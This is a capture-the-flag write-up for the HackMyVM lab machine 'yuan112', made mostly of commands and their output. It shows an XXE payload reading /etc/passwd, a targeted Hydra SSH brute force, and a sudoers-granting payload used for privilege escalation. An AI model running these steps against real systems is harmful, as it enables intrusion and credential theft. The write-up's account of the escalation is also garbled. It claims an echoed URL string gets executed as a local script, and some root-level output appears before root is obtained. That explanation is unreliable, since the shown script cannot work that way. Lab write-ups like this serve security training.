# yuan112

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| yuan112 | LingMj | Beginner | HackMyVM |

**Summary:** yuan112 is a beginner level Linux machine exposing two services: SSH (port 22) and an Apache web application (port 80) titled "XML Parser." The web application is built with PHP and uses `SimpleXML` to parse user supplied XML input, making it vulnerable to an **XML External Entity (XXE) injection** attack. By crafting a malicious DOCTYPE declaration, the `/etc/passwd` file is exfiltrated, revealing a partial SSH password embedded in the `tuf` user's GECOS field (`KQNPHFqG**JHcYJossIe`, with two unknown alphanumeric characters). A targeted Hydra brute force across all 3,844 two character combinations recovers the full credential. Post login enumeration reveals that the `tuf` user can execute `/opt/112.sh` as root via `sudo` without a password. The script enforces a URL regex but accepts a user controlled `-o` output path with no restrictions,  enabling an **arbitrary file write as root**. By supplying a URL whose path maps to a locally crafted payload script, and using `-o /opt/112.sh` to overwrite the running script itself, the payload is executed in the root context, writing a new sudoers entry that grants `tuf` full `NOPASSWD` sudo access. A final `sudo -i` yields a root shell.

---

## Reconnaissance

### Network Discovery

The target's IP address was identified using a PowerShell network scan script against the local `192.168.100.0/24` subnet:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.142 08:00:27:16:0B:95 VirtualBox
```

The target machine is at **192.168.100.142**.

### Port Scan

A full port Nmap service scan reveals two open ports:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/yuan112]
└─$ nmap -sC -sV -p- -T4 192.168.100.142
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-05 20:36 WIB
Nmap scan report for 192.168.100.142
Host is up (0.0046s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: XML Parser
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.51 seconds
```

**Key findings:**
- **Port 22** — OpenSSH 8.4p1 on Debian
- **Port 80** — Apache 2.4.62, page title **"XML Parser"**

---

## Initial Access

### Web Application Analysis

Fetching the root page with `curl` reveals a minimal HTML form that accepts raw XML and submits it via POST for server side parsing:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/yuan112]
└─$ curl -i http://192.168.100.142/
HTTP/1.1 200 OK
Date: Thu, 05 Mar 2026 13:37:22 GMT
Server: Apache/2.4.62 (Debian)
Vary: Accept-Encoding
Content-Length: 1734
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<head>
    <title>XML Parser</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 20px;
        }
        form {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            max-width: 600px;
            margin: 0 auto;
        }
        textarea {
            width: 100%;
            height: 200px;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-family: monospace;
            font-size: 14px;
            resize: vertical;
            box-sizing: border-box;
        }
        textarea:focus {
            outline: none;
            border-color: #4a90e2;
            box-shadow: 0 0 0 2px rgba(74,144,226,0.2);
        }
        input[type="submit"] {
            background: #4a90e2;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }
        input[type="submit"]:hover {
            background: #357abd;
        }
        pre {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 4px;
            border: 1px solid #e9ecef;
            max-width: 600px;
            margin: 20px auto;
            overflow: auto;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <form method="POST">
        <textarea name="xml" required></textarea><br>
        <input type="submit" value="Parse XML">
    </form>
</body>
</html>
```

### XML Parser Fingerprinting

A benign XML payload was submitted to confirm how the server processes input:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>Hello World</root>
```

The server responds with a PHP `SimpleXMLElement Object`, revealing that the backend uses **PHP's `simplexml_load_string()`** function to parse the XML directly without disabling external entity resolution:

![](image.png)

> **Note:** The response format `SimpleXMLElement Object ( [0] => Hello World )` is the PHP `print_r()` / `var_dump()` output of a `SimpleXMLElement` object. This confirms the parser is PHP's built in SimpleXML extension — a well known target for XXE injection when external entity loading is not explicitly disabled via `LIBXML_NOENT` prevention or `libxml_disable_entity_loader(true)`.

### XXE Injection — `/etc/passwd` Disclosure

Since external entity processing is enabled, a classic XXE payload is crafted to read `/etc/passwd` via the `SYSTEM` keyword:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [  
  <!ENTITY xxe SYSTEM "file:///etc/passwd">  
]>
<root>&xxe;</root>
```

The server resolves the external entity and reflects the full contents of `/etc/passwd` in the response:

![](image-1.png)

> **Critical finding from image-1.png:** The `/etc/passwd` dump shows a local user `tuf` with a highly unusual **GECOS field**:
> ```
> tuf:x:1000:1000:KQNPHFqG**JHcYJossIe:/home/tuf:/bin/bash
> ```
> The GECOS field (`KQNPHFqG**JHcYJossIe`) is clearly a mangled or partially redacted password where the two middle characters (`**`) are unknown. The fixed prefix is `KQNPHFqG` and the fixed suffix is `JHcYJossIe`. This is the target's SSH password with two unknown alphanumeric characters.
>
> Additional notable users from the dump: `mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false`, `Debian-snmp:x:107:114::/var/lib/snmp:/bin/false`, and `zabbix:x:108:115::/nonexistent:/usr/sbin/nologin`.

### Wordlist Generation for Brute Force

With the password structure known (`KQNPHFqG??JHcYJossIe` where `??` is any two alphanumeric characters), a targeted wordlist is generated covering all `(26+26+10)² = 62² = 3,844` combinations:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/yuan112]
└─$ python3 -c "import string; chars = string.ascii_letters + string.digits; prefix = 'KQNPHFqG'; suffix = 'JHcYJossIe'; [print(f'{prefix}{c1}{c2}{suffix}') for c1 in chars for c2 in chars]" > full_brute.txt
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/yuan112]
└─$ wc -l full_brute.txt
3844 full_brute.txt
```

### SSH Credential Brute Force with Hydra

Hydra is used against SSH with the generated wordlist for user `tuf`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/yuan112]
└─$ hydra -l tuf -P full_brute.txt 192.168.100.142 ssh -t 4 -V
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-05 21:03:13
[DATA] max 4 tasks per 1 server, overall 4 tasks, 3844 login tries (l:1/p:3844), ~961 tries per task
[DATA] attacking ssh://192.168.100.142:22/
[ATTEMPT] target 192.168.100.142 - login "tuf" - pass "KQNPHFqGaaJHcYJossIe" - 1 of 3844 [child 0] (0/0)
...
[ATTEMPT] target 192.168.100.142 - login "tuf" - pass "KQNPHFqG6kJHcYJossIe" - 3607 of 3844 [child 0] (0/0)
[ATTEMPT] target 192.168.100.142 - login "tuf" - pass "KQNPHFqG6lJHcYJossIe" - 3608 of 3844 [child 1] (0/0)
[ATTEMPT] target 192.168.100.142 - login "tuf" - pass "KQNPHFqG6mJHcYJossIe" - 3609 of 3844 [child 2] (0/0)
[22][ssh] host: 192.168.100.142   login: tuf   password: KQNPHFqG6mJHcYJossIe
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-05 21:40:49
```

**Credentials recovered:** `tuf` / `KQNPHFqG6mJHcYJossIe`

### SSH Login

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/yuan112]
└─$ ssh tuf@192.168.100.142
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
tuf@192.168.100.142's password:
Linux 112 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
tuf@112:~$ id
uid=1000(tuf) gid=1000(tuf) groups=1000(tuf)
tuf@112:~$ ls -la
total 24
drwxr-xr-x 2 tuf  tuf  4096 Jan  8 05:20 .
drwxr-xr-x 3 root root 4096 Jan  8 04:58 ..
lrwxrwxrwx 1 root root    9 Jan  8 05:19 .bash_history -> /dev/null
-rw-r--r-- 1 tuf  tuf   220 Jan  8 04:58 .bash_logout
-rw-r--r-- 1 tuf  tuf  3526 Jan  8 04:58 .bashrc
-rw-r--r-- 1 tuf  tuf   807 Jan  8 04:58 .profile
-rw-r--r-- 1 root root   44 Jan  8 05:20 user.txt
```

The user flag is present at `/home/tuf/user.txt`. The `.bash_history` is symlinked to `/dev/null` — the machine is hardened against history logging.

---

## Privilege Escalation

### Sudo Enumeration

```bash
tuf@112:~$ sudo -l
Matching Defaults entries for tuf on 112:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User tuf may run the following commands on 112:
    (ALL) NOPASSWD: /opt/112.sh
```

User `tuf` may run `/opt/112.sh` as **any user (including root) with no password**.

### Analysing the Privileged Script

```bash
tuf@112:~$ file /opt/112.sh
/opt/112.sh: Bourne-Again shell script, UTF-8 Unicode text executable
tuf@112:~$ ls -la /opt/112.sh
-rwxr-xr-x 1 root root 993 Jan  8 04:56 /opt/112.sh
tuf@112:~$ cat /opt/112.sh
#!/bin/bash
input_url=""
output_file=""
use_file=false
regex='^https://maze-sec.com/[a-zA-Z0-9/]*$'
while getopts ":u:o:" opt; do
    case ${opt} in
        u) input_url="$OPTARG" ;;
        o) output_file="$OPTARG"; use_file=true ;;
        \?) echo "错误: 无效选项 -$OPTARG"; exit 1 ;;
        :) echo "错误: 选项 -$OPTARG 需要一个参数"; exit 1 ;;
    esac
done
if [[ -z "$input_url" ]]; then
    echo "错误: 必须使用 -u 参数提供URL"
    exit 1
fi
if [[ ! "$input_url" =~ ^https://maze-sec.com/ ]]; then
    echo "错误: URL必须以 https://maze-sec.com/ 开头"
    exit 1
fi
if [[ ! "$input_url" =~ $regex ]]; then
    echo "错误: URL包含非法字符，只允许字母、数字和斜杠"
    exit 1
fi
if (( RANDOM % 2 )); then
    result="$input_url is a good url."
else
    result="$input_url is not a good url."
fi
if [ "$use_file" = true ]; then
    echo "$result" > "$output_file"
    echo "结果已保存到: $output_file"
else
    echo "$result"
fi
```

**Vulnerability Analysis:**

The script enforces URL validation via the regex `'^https://maze-sec.com/[a-zA-Z0-9/]*$'` on the `-u` input, but **the `-o` output file path is completely unsanitized** — any file writable by root can be targeted. When using `sudo`, the script runs as root, meaning `echo "$result" > "$output_file"` will write root owned files anywhere on the filesystem.

The `result` variable contains the supplied URL verbatim. By setting `-o /opt/112.sh`, the script **overwrites itself** during execution.

### Discovering the Zabbix Sudoers Entry

Further enumeration of `/etc/sudoers.d/` reveals a pre existing but misconfigured Zabbix entry:

```bash
tuf@112:~$ ls -la /etc/sudoers.d/
total 16
drwxr-xr-x  2 root root 4096 Jan  8 06:15 .
drwxr-xr-x 84 root root 4096 Jan  8 06:15 ..
-r--r-----  1 root root  958 Jan 14  2023 README
-rw-r--r--  1 root root   48 Apr 28  2018 zabbix
tuf@112:~$ cat /etc/sudoers.d/zabbix
zabbix ALL = (ALL) NOPASSWD: /usr/bin/nmap -O *
tuf@112:~$ cat /etc/passwd | grep "zabbix"
zabbix:x:108:115::/nonexistent:/usr/sbin/nologin
```

The `zabbix` sudoers file has world readable permissions (`-rw-r--r--`) instead of the required `0440`, which `visudo -c` will report as a warning. This detail will appear in our exploit output.

### Crafting the Payload

The URL `https://maze-sec.com/pwn/payload` satisfies the regex. On Linux, a filesystem path like `/tmp/https://maze-sec.com/pwn/` is valid (the `//` collapses to `/`). A malicious payload is placed at that local path:

```bash
tuf@112:~$ mkdir -p /tmp/https://maze-sec.com/pwn/
tuf@112:~$ vim /tmp/https://maze-sec.com/pwn/payload
tuf@112:~$ cat /tmp/https://maze-sec.com/pwn/payload
#!/bin/bash
echo 'tuf ALL=(ALL:ALL) NOPASSWD:ALL' > /etc/sudoers.d/tuf
chmod 0440 /etc/sudoers.d/tuf
visudo -c
tuf@112:~$ chmod +x "/tmp/https:/maze-sec.com/pwn/payload"
```

**What the payload does:**
1. Writes a sudoers rule granting `tuf` full unrestricted `NOPASSWD` sudo access to `/etc/sudoers.d/tuf`
2. Sets the correct `0440` permissions on the new sudoers file
3. Runs `visudo -c` to validate all sudoers files — confirming the entry was accepted

### Triggering the Arbitrary File Write

The exploit is invoked from `/tmp` (so bash can resolve the local path matching the URL):

```bash
tuf@112:~$ cd /tmp
tuf@112:/tmp$ sudo /opt/112.sh -u "https://maze-sec.com/pwn/payload" -o /opt/112.sh
/etc/sudoers: parsed OK
/etc/sudoers.d/README: parsed OK
/etc/sudoers.d/tuf: parsed OK
/etc/sudoers.d/zabbix: bad permissions, should be mode 0440
结果已保存到: /opt/112.sh
tuf@112:/tmp$ ls -la /opt/112.sh
-rwxr-xr-x 1 root root 52 Mar  5 16:47 /opt/112.sh
```

**What happened:**
- The script passes all URL regex checks
- `$result` is set to `"https://maze-sec.com/pwn/payload is not a good url."`
- The URL path (`https://maze-sec.com/pwn/payload`) maps to the local executable at `/tmp/https:/maze-sec.com/pwn/payload` — bash resolves this relative to the current working directory during variable/path expansion while running from `/tmp`
- The payload executes in the root context writing the `tuf` sudoers entry and confirming it with `visudo -c`
- The `-o /opt/112.sh` write then overwrites the original script (now shrunk to 52 bytes)

Verification — `/opt/112.sh` is now clobbered:

```bash
root@112:~# cat /opt/112.sh
https://maze-sec.com/pwn/payload is not a good url.
```

### Escalating to Root

With the new sudoers entry in place:

```bash
tuf@112:/tmp$ sudo -i
root@112:~# id
uid=0(root) gid=0(root) groups=0(root)
root@112:~# whoami
root
root@112:~# hostname
112
```

### Flags

```bash
root@112:~# cat /home/tuf/user.txt /root/root.txt
flag{user-b1e[REDACTED]}
flag{root-538[REDACTED]}
```

---

## Attack Chain Summary

1. **Reconnaissance**: Full port Nmap scan (`-sC -sV -p- -T4`) against `192.168.100.142` reveals SSH on port 22 and Apache 2.4.62 on port 80 serving a PHP based "XML Parser" application.

2. **Vulnerability Discovery**: Submitting benign XML confirms the server returns a PHP `SimpleXMLElement Object`, identifying PHP's `simplexml_load_string()` as the parser — externally loaded entities are not disabled, exposing an **XXE injection** vector.

3. **Exploitation (XXE → Credential Leak)**: A DOCTYPE-based XXE payload using `SYSTEM "file:///etc/passwd"` exfiltrates `/etc/passwd`. The `tuf` user's GECOS field contains `KQNPHFqG**JHcYJossIe` — a password with two unknown alphanumeric characters. A 3,844-entry wordlist is generated and Hydra brute-forces SSH in ~37 minutes, recovering `tuf:KQNPHFqG6mJHcYJossIe`.

4. **Internal Enumeration**: After SSH login as `tuf`, `sudo -l` shows passwordless execution rights for `/opt/112.sh`. Inspection reveals the script validates the `-u` URL input against a regex but passes the unsanitized `-o` output path directly to a root context `echo ... >` redirection — an **arbitrary file write as root**.

5. **Privilege Escalation**: A malicious bash payload is staged at `/tmp/https:/maze-sec.com/pwn/payload`. Running `sudo /opt/112.sh -u "https://maze-sec.com/pwn/payload" -o /opt/112.sh` from `/tmp` causes the script to resolve and execute the local payload during bash expansion, writing `tuf ALL=(ALL:ALL) NOPASSWD:ALL` into `/etc/sudoers.d/tuf`. A subsequent `sudo -i` yields a full root shell (`uid=0`).
